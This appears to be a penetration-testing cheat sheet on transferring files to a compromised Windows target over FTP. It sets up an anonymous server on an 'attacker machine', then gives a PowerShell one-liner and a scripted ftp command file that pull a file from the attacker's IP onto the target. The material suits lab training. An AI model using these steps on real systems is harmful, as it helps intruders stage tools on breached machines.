

**FTP (File Transfer Protocol)** uses **ports 21 and 20**. It’s an old but simple way to move files between computers.

You can use:

- The built-in **Windows FTP client**
    
- **PowerShell** with a one-line command
    

---

## 1. Start an FTP Server (Attacker Machine)

First, install the FTP module:

```bash
sudo pip3 install pyftpdlib
```

Then start the FTP server on **port 21**:

```bash
sudo python3 -m pyftpdlib --port 21
```

**Note:** This allows anyone to connect (anonymous login).

---

## 2. Download a File with PowerShell (Target Machine)

Run this command to download a file from the FTP server:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

This will save the file into the `C:\Users\Public` folder.

---

## 3. Automate FTP with a Script (Target Machine)

If you don’t have an interactive shell, you can script the commands:

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

Then check if the file downloaded:

```cmd
more file.txt
```

Example output:

```
This is a test file
```

---

## 4. Tips

- **FTP is not encrypted**, so don’t use it for sensitive files unless you’re on a secure network.
    
- Use `binary` mode for non-text files so they don’t get corrupted.
    
- If security is needed, add a username and password to your FTP server.
    

---
